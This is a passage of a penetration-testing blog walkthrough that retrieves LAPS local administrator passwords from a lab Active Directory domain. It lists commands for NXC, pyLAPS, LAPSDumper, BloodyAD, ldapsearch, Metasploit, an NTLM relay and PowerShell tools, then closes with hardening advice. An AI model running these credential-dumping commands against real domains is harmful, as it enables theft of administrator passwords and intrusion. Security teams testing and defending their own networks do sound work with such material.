<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgiEnE31J2IZiIAYpicI8Sowl_LzzTb20kh2083GZL1WQjo45nxSTirWqiNRSzbew3mvOi4DdLJ-ZhyphenhyphenGEt6c__I-BEo5NZvKQBUoN_OogcL-GcaHE9FLERTy7kCJLgW08r6tTpxS0ekON-F7eC4dZ7MbSBsaJ6NtPBBYhg-UznDza9QYUjZxBObcgyL4qpz/s16000/49.png"/></span></p>
<h3><span style="color: #800000;">NXC tool</span></h3>
<p><span style="color: #000000;">NXC, short for NetExec, is a Python-based tool that automates the exploitation of network services such as SMB, LDAP, WinRM, RDP, WMI, MSSQL, and more. It’s designed to streamline internal penetration testing by providing a unified interface for interacting with Windows protocols, much like Impacket, but with a focus on multi-protocol support and modular extensions.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nxc ldap "192.168.1.48" -d "ignite.local" -u "raj" -p "Password@1" --module laps</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgfTHL1139CkK785V6Edf64ZbugpMvYB9K8_T6nuS-c3QPXcQ0i7-RtZjQeF7FHO6jopkQSfIfzUTzZaUzdo329Ov44WLskr2PqrwGQ2EOPaUuzushSV8Va_a1cgRHIs3ZAjfWr0DexlwXPfJCgwVkFGwOyZuo_r5EwHrXR9TiGCwHQ1QebGj0YrnOgCiNJ/s16000/50.png"/></strong></span></p>
<h3><span style="color: #800000;">PyLaps</span></h3>
<p><span style="color: #000000;"><a href="https://github.com/P0dalirius/pyLAPS"><span style="color: #0000ff;">GitHub – p0dalirius/pyLAPS</span></a>: Python setter/getter for property ms-Mcs-AdmPwd used by LAPS.</span></p>
<p><span style="color: #000000;">This script is a python setter/getter for property ms-Mcs-AdmPwd used by LAPS inspired by @swisskyrepo’s SharpLAPS in C#.</span></p>
<p><span style="color: #000000;">Clone the repository:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/p0dalirius/pyLAPS
cd pyLAPS
chmod 777 pyLAPS.py</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhYdAeByxzub9Iw8vVI8sm3au0vmtNC4N1UcKzMtnXu24Sdup25c-_nerVUUUoazRBx5RWj7d6W72jOwSzEwAIYMKd0VsmnZSEeuJiSspEBqU6JfqiONzulJdvrqG78cRx4_525yAGTvFRaAY__5yMSoE0SmmZAs2MyZkoLfs4EmoTkCvEohyphenhyphenDum42wodKB/s16000/51.png"/></strong><strong> </strong></span></p>
<p><span style="color: #000000;">Run the script</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic"> ./pyLAPS.py --action get -d "192.168.1.48" -u "raj" -p "Password@1"</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh4xpn3uRUdkxHGunAMlqUSCiLyU9L1c6JT3n-s-SsE73yGICjGFNVlgoDhfS3-_028_VqgpLXA7-VdJXgguC7IDeUNlh9cXUVvtc71SAFTs5CJYIGTesbGlkpcSXyxgKcfPWsZkDQ8IUu3K5smU_H9pumDGSQj396Of21RkvDp8ZRCWOO-qFQoNbsXhoPV/s16000/52.png"/></strong></span></p>
<h3><span style="color: #800000;">LAPSDumper</span></h3>
<p><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/n00py/LAPSDumper">GitHub – n00py/LAPSDumper: Dumping LAPS from Python</a></span></p>
<p><span style="color: #000000;">Clone the repository:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/n00py/LAPSDumper
cd LAPSDumper
chmod 777 laps.py</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEitnlvIcQt-TQJrKARDbm14imBO_QZHkIbjL0-mkw-snwQwknloYj_UJVl7pkogD0pY4jYa5jA7W4hHgOld8MRo4N4j5AnsPXBoC08K-I3_EktciKtSIRfzWFHVoy9AZtXxrZJ1DOf-aG75pypg7fNFnfvyQzUbUY8cdVwGmMsOkUUZNbpcUBfdVp6qZEdq/s16000/53.png"/></strong></span></p>
<p><span style="color: #000000;">Run the script</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python laps.py -u 'raj' -p 'Password@1' -d 'ignite.local'
</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgdVSMeebvdPUx7mgT7Qk7bSMotCPuRhTQ9ZRPrvZrNj_1w_teDu-6iAnOL7mUqqLE0gfKl-Rqcp7A5WHc5Kt6m9sLUVkV9SUf062svegEg1ESDFeopRYSYKCbRwN7IhdzbFUy6Mk1RyIzf386x1eXRaVdox_90irQ_Sna0fQxEjc7dynswxD7tHqivpiDG/s16000/54.png"/></strong></span></p>
<h3><span style="color: #800000;">BloodyAD</span></h3>
<p><span style="color: #000000;">BloodyAD is an open-source Active Directory (AD) privilege escalation framework designed to assist security professionals, penetration testers, and red teams in identifying and exploiting privilege escalation paths within AD environments.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bloodyAD --host "192.168.1.48" -d "ignite.local" -u "raj" -p "Password@1" get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgFdud9tIxOboC6kwtADGdkv2REfwkR-ZuFvAI-ffWhxK0FL_nST7uctEnwF_GfQNB5jTA1d5PNoVQYRs5q9kQn6QiFKLvrtAX_nipWEs-7VwiUI4Y69gBML1qoAHntK8L0QJYDmiYkqzIBVF9IeaXlCwQCVaeRCianJ5ilEYaixf59MM6BORl289nyh5ni/s16000/55.png"/></strong></span></p>
<h3><span style="color: #800000;">Ldapsearch</span></h3>
<p><span style="color: #000000;"><strong>ldapsearch</strong> is a command-line tool used to query and retrieve information from an LDAP (Lightweight Directory Access Protocol) directory service, such as Active Directory (AD) or an OpenLDAP server. It is part of the OpenLDAP software suite and is widely used by system administrators, security professionals, and penetration testers to interact with LDAP directories, extract data (e.g., user accounts, group memberships, or attributes like LAPS passwords), and troubleshoot directory-related issues. ldapsearch allows you to perform searches based on filters, retrieve specific attributes, and authenticate to the directory using various methods.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ldapsearch -x -H ldap://192.168.1.48 -D "raj@ignite.local" -w "Password@1" -b "dc=ignite,dc=local" "(&amp;(objectCategory=computer)(ms-MCS-AdmPwd=*))" ms-MCS-AdmP</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTtMgbeYhGFUtay8wqG5A88LqLwJJKMTCA3AcGKWe0CTJEWml5f-6uvnlcuFtVjCrCjB_-4nlTmFWSHTd-OqR4g7XmDb9oLoIn85uAQJ2YgOvoXHVcDJXLudj-K0pAFh6Qx6TJziMT5wOroRSqknpuio1qDB0CSYfzI_A1A0bLO08ir2Z1wRJfEZCobKS5/s16000/56.png"/></strong></span></p>
<h3><span style="color: #800000;">Metasploit: ldap_query</span></h3>
<p><span style="color: #000000;">This module (<strong>auxiliary/gather/ldap_query</strong>) allows users to query an LDAP server using either a custom LDAP query or a set of LDAP queries under a specific category.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/gather/ldap_query
set rhosts 192.168.1.48
set username raj
set password Password@1
set domain ignite.local
set action ENUM_LAPS_PASSWORDS
run</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEggxEPIsewZyTlUtZTfx63DU3bopUvctth9gpzqPwk9hFAfxLuTUUlyo12HKFhs8Pwvd_pbCH5ax73oxu1G_KpqKPrPHdz9HiOB6rDyrgAzp59qhdQCC70JPbQ23MsTxHSeBDqbB8sPXH2jyq1Ru7t1QCa19NK5skBJZHYwk-KQAPp8zwHhfXYKa4wixxVy/s16000/57.png"/></strong></span></p>
<h3><span style="color: #800000;">Impacket-ntlmrelayx</span></h3>
<p><span style="color: #000000;">This module performs the SMB Relay attacks originally discovered by cDc, extended to many target protocols (SMB, MSSQL, LDAP, etc)</span></p>
<p><span style="color: #000000;">Alternatively. Impacket’s <a style="color: #000000;" href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py">ntlmrelayx</a> also carries that feature, usable with the –dump-laps</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-ntlmrelayx -t ldaps://192.168.1.48 -debug --dump-laps --no-dump --no-da --no-acl --no-validate-privs</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhQdvIVID6RrnGritWmV-ZB_0-xDYONwNNAy8bgWBZvFDgfSmImIZYStQEjCSUfLBB2uFJSbu0EXup_MWoDh9Bkm-fiMaTlc5Co15p7W0cZ_jpCqBm2pyjsJm1utPBh0MOXuRecvimJKbZJZSIJxWPpkkRFNuMGUzBlJf2oHQ94of-o9Q3LV67818nyJWHX/s16000/58.png"/></span></p>
<p><span style="color: #000000;">Trigger a callback via browser, using the Raj user’s credentials.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEglbIoYpJumlJoQTc_BNWfFT8qbLI255bjVappFHOnft5o5Kk_4-k_Su-DaKDbo-p4KkHfB-twhTs3qWZpRt5uR0UI0kCrpOex5JiqmIrIRYkm7KY42-7dtbXr5ndJbtZ5hjoKLzlYVDI2w6ukE7JLo8Bke_PKZlFynZ-_2rwcKyo7hRp-pYIzJmefRJCaD/s16000/59.png"/></span></p>
<p><span style="color: #000000;">After a brief wait, we receive an HTTP connection from the Raj user’s account along with the LAPS password.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjWa4hfKAx_JHl7YSM-hRQyw05-ZwLDjjOKoVywsUQ3p3L_ChqrjaKLfjlO2xtZe80zz9rp7I4xcztA5_G_icelCybIQr8HBpAOvC6HX-hgn66Voi-RFKjgHbnXnRRcSI6zPn-GkGLNIy4mhF6OBc9oNpYC8cReDVZ09uvDqU3GzY7yMR3GPbLLXfBO1HHW/s16000/60.png"/></span></p>
<h3><span style="color: #800000;">ldap_shell</span></h3>
<p><span style="color: #000000;">This project is a fork of ldap_shell from Impacket. It provides an interactive shell for Active Directory enumeration and manipulation via LDAP/LDAPS protocols, making it useful for both system administrators and security professionals.</span></p>
<p><span style="color: #000000;">This can also be achieved using<span style="color: #0000ff;"> <a style="color: #0000ff;" href="https://github.com/PShlyundin/ldap_shell">ldap_shell</a></span>:</span></p>
<p><span style="color: #000000;">Clone the repository and install:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/PShlyundin/ldap_shell</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiVS2aPLnHfVewKSGzsvoAZPIRGyJDSfi4UqaRjFORXQMDIb5lfUxb4ZtWtP8BMNf9YTFdOHrsbQbvF492uVvAOqiLrx8cwK0XqD1gWqSqp3lFAv7S71ptFC-mMon9rTMjruYxOoX1UFUlUiK_u8sV1KEebFZpMLYGy9_KJHxbx5bSgAopW-wpYt5DP1fB1/s16000/61.png"/></span></p>
<p><span style="color: #000000;">Use the <strong>get_laps_gmsa</strong> option after getting a shell as the raj user.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ldap_shell ignite.local/raj:Password@1 -dc-ip 192.168.1.48</pre>
<p><span style="color: #000000;"><strong><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZ1ddzEh0d7q1iOu2NQHEBUhGlMcromDVa7wVRKtqhhScw-jjm1ORY2goH0QWFV3Ta4FE0cetn4RmWOcLNoaadMHWjjHPRRGXRZsoZwNPCrJJSLCZL1aQ8p2Zop-WPrEqPRwCT1siBPFvgjr6EQthyphenhyphenlnsQtMQDGENElO-uDzp89hIRQgUwfCKpN1RBKZAq/s16000/62.png"/> </strong></span></p>
<p><span style="color: #000000;"><strong>Windows Exploitation</strong></span></p>
<h3><span style="color: #800000;">Poweshell</span></h3>
<p><strong>Download</strong> <a href="https://github.com/kfosaaen/Get-LAPSPasswords">Get-LAPSPAsswords</a></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Powershell –ep bypass
Import-Module .\Get-LAPSPasswords.ps1
GET-LAPSPasswords -DomainControler 192.168.1.48 -Credentials IGNITE\raj | Format-Table -Autosize</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEimSOPDSAyIagkf4IBQQCC7TBrLK8qubyMmK1g9CaJrbVAPuveH6ivunH6svzVO2_Hz0PnrLwo6sG08g5qI_VlZ-yxYQwTBLx8HiB13-7rPga1M5_HOFAJSDlQxofOsxyilf22AuZciZ3uj_Y0e10l-ub_i_uRGNSZSYuLBG4vhByFZ15a7wqbfkeMNscIt/s16000/100.png"/></span></p>
<h3><span style="color: #800000;">NetTools</span></h3>
<p><span style="color: #000000;"><a style="color: #000000;" href="https://nettools.net/download/"><strong>Download</strong> |<span style="color: #0000ff;"> NetTools</span></a></span></p>
<p><span style="color: #000000;">NetTools is a free Active Directory troubleshooting tool, which provides the ability to troubleshoot, query, report and update Active Directory and other LDAP based directories.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgDs6LIN3WLIi6rmhNyiWgui4YRSJb1fxlNb-oSvmpPzf3UzadIDarO8I184UL7iRj5UNPUsAp1KTKK570v5T-U5ePTxiOy3z-mWfUbQBzaNK5CxSVBB5V-i6X61e4NuHRp3sCkz-eApZOYYW8KikiXaKV2GJSxRog0a97rQtogzdEi_SMfOc7vYOiZCYFS/s16000/101.png"/></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgHnBs42f2ZVrt2cusTgRQ5kpmvrAwiZkaFBn3vQ5fFcqcoL2mRrp0S9dmHY32HxsfFqawWbzEQfdMEejljTT3fAME9pwPNO6xT_lhFEiTcmhglYl1EmZbX-EV3meE1DTirJaEHdHinMINP8txpXmQHld4Y3QeqCc3nU_3eovRtc2jzz1nDTHqxYCjMzsHO/s16000/102.png"/></span></p>
<h3><span style="color: #800000;">Sharplaps</span></h3>
<p><span style="color: #000000;"><strong>Download</strong> <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/swisskyrepo/SharpLAPS/releases/tag/latest-SharpLAPS">Sharplaps</a></span></span></p>
<p><span style="color: #000000;">This executable is made to be executed within a Cobalt Strike session using execute-assembly. It will retrieve the LAPS password from the Active Directory.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjUyHWh700Qb-XKhopk_bYn1RclZchETbjMyeBI7foYEP1Lrio5dj6XxN18NO0-LBrWwOvbuEVy_Bb5ctua7FXP9J1y22TO9AzElppbi6xkuq8R-rfAPx9b8Gtk2G03MLLN_h9198K2vF5o51BvIobo_iW4ElzYRl_UrWx6MEGVpz96JVhNIohNUI4QIneL/s16000/103.png"/></span></p>
<h3><span style="color: #800000;">Metasploit: enum_laps</span></h3>
<p><span style="color: #000000;">This module (<strong>post/windows/gather/credentials/enum_laps</strong>) will recover the LAPS (Local Administrator Password Solution) passwords, configured in Active Directory, which is usually only accessible by privileged users. Note that the local administrator account name is not stored in Active Directory, so it is assumed to be ‘Administrator’ by default.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use post/windows/gather/credentials/enum_laps
set session 1
run</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj4XHXfS_gKy0n_1RAY9oSKQMUrnkjaVI3670SoG_fRD6PBQwFvURv2o51JyTdVl9kvLH3C_8OstpFKnLXngNBW-rahjBZBJYxFBIpPuS7CTUHLdRBY5gXa4-etEo2D0pmdGk9iPG5XTI9s0O_L_2YFpI6mK6rLCBFYsQDqPPmAXPY_DMJOLO4cu-Nbv5II/s16000/104.png"/></strong></span></p>
<h3><span style="color: #800000;">Powerview</span></h3>
<p><span style="color: #000000;">PowerView is a PowerShell tool to gain network situational awareness on Windows domains.</span></p>
<p><span style="color: #000000;"><strong>Download</strong> <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">Powerview</a></span></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Import-Module .\PowerView.ps1
Get-DomainComputer MSEDGEWIN10 -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh0Hp_Jp8R0b4safQ1cXJ0hNqH_4Fx7YAMbgyCezz91r6eOu9Ss0nyWKYTfqhMRr6tp8UHRIUCazhYgD-T7NqHwl_WLUMYRmimui95rhv36Z8bRJSEysiJeXbyLk97qvU1ezIvovPMxQrmCWK1W4PscWkCadxHqk4tgbbq3Yeh-3r8eT6VuGvHARByNkDww/s16000/106.png"/></strong></span></p>
<h3><span style="color: #800000;">Active Directory Explorer – Sysinternals</span></h3>
<p><span style="color: #000000;">Active Directory Explorer (AD Explorer) is an advanced Active Directory (AD) viewer and editor. You can use AD Explorer to easily navigate an AD database, define favorite locations, view object properties and attributes without having to open dialog boxes, edit permissions, view an object’s schema, and execute sophisticated searches that you can save and re-execute.</span></p>
<p><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer">AD Explorer – Sysinternals | Microsoft Learn</a></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEivRRHoIaOy809G4u3MqAEG6rTv8izeK7pFMbRW-eY8m_topFm4wvH-d3pKcn0gGohGK1Jr7R-J8ucWVpqiI4mTNvDEvR4N2JhFxJOcUAEWPRDxMRk_PaYLMvr6xUp6xAnm_Kb9S2ofUuSdQtEX8AmqF5Jhks76l9vhex1Av7U4WvP4dJqHhjNO9tIy0RFo/s16000/108.png"/></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhned2e375IPnJpEEsWknNR8cF9dnhhDLLg2lVi0LOG3jjsjOWOxzJO7GtW9hIUxli41L3ICtC6whXBi-ZmtuSjdjRGLArQa8GaJmXyk3aTBfTg6_kQblEy9mpeHgV2pqPnBnkYSSEDwFrduXBGC_c4kI5gTVaodsT3NXSy2fhdSty3MpzDiBlUgsGjl7wi/s16000/109.png"/></span></p>
<h3><span style="color: #800000;">Conclusion</span></h3>
<h4><span style="color: #000000;"> Best Practices for LAPS Security:</span></h4>
<ul>
<li><span style="color: #000000;"><strong>Least Privilege</strong>: Grant read access to ms-Mcs-AdmPwd only to specific groups (e.g., LAPS Readers), not individual users like raj</span></li>
<li><span style="color: #000000;"><strong>Upgrade to Windows LAPS</strong>: If possible, migrate to Windows LAPS for encryption and Azure AD integration.</span></li>
<li><span style="color: #000000;"><strong>Regular Auditing</strong>: Use tools like NetTools, BloodHound, and PowerShell to audit LAPS access weekly.</span></li>
<li><span style="color: #000000;"><strong>Monitor Logs</strong>: Enable AD auditing and review Event Viewer for unauthorized access attempts.</span></li>
<li><span style="color: #000000;"><strong>Secure Credentials</strong>: Protect accounts like raj with strong passwords and multi-factor authentication (MFA) if possible.</span></li>
<li><span style="color: #000000;"><strong>Test with Tools</strong>: Use Impacket, NXC, BloodyAD, and ldapsearch to simulate attacks and validate defenses.</span></li>
<li><span style="color: #000000;"><strong>Patch and Update</strong>: Ensure domain controllers (ignite.local) and clients (MSEdgeWin10) are patched to mitigate vulnerabilities.</span></li>
</ul>
<h4><span style="color: #000000;"> Summary of Key Takeaways</span></h4>
<ul>
<li><span style="color: #000000;">LAPS is a critical tool for managing local admin passwords, reducing credential reuse risks in ignite.local.</span></li>
<li><span style="color: #000000;">Proper permission management (e.g., limiting Raj’s access) prevents LAPS password retrieval attacks, as seen with impacket-GetLAPSPassword.</span></li>
<li><span style="color: #000000;">Tools like BloodHound, NXC, and BloodyAD help identify and exploit LAPS vulnerabilities, while NetTools and ldapsearch aid in manual verification.</span></li>
<li><span style="color: #000000;">Hardening AD permissions, enabling encryption, and auditing access are essential to secure LAPS deployments.</span></li>
<li><span style="color: #000000;">Regular testing in a lab environment (ignite.local) ensures robust LAPS security before production deployment.</span></li>
</ul>
<h5><span style="color: #000000;"><strong>Notes</strong></span></h5>
<ul>
<li><span style="color: #000000;"><strong>Lab Context</strong>: The content is tailored to your lab (ignite.local, OU=Lab_machines,OU=ScrollLab), focusing on practical steps for Raj and MSEdgeWin10.</span></li>
<li><span style="color: #000000;"><strong>Tool Integration</strong>: Incorporates your use of BloodHound (e.g., identifying raj’s permissions), Impacket (e.g., GetLAPSPassword), NXC, BloodyAD, ldapsearch, and NetTools for a comprehensive defense strategy.</span></li>
<li><span style="color: #000000;"><strong>Security Focus</strong>: Emphasizes least privilege and auditing, addressing the overly permissive “All extended rights” you granted to raj.</span></li>
<li><span style="color: #000000;"><strong>Windows LAPS</strong>: Highlights the encryption feature of Windows LAPS, which isn’t available in legacy LAPS, encouraging an upgrade for better security.</span></li>
</ul>
<p><strong>Author: </strong><span style="color: #000000;">Vicky D. Jadhav – IoT &amp; Automation Engineer | Cybersecurity Research Enthusiast. Contact <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.linkedin.com/in/jvickyj/"><strong>Linkedin</strong></a></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
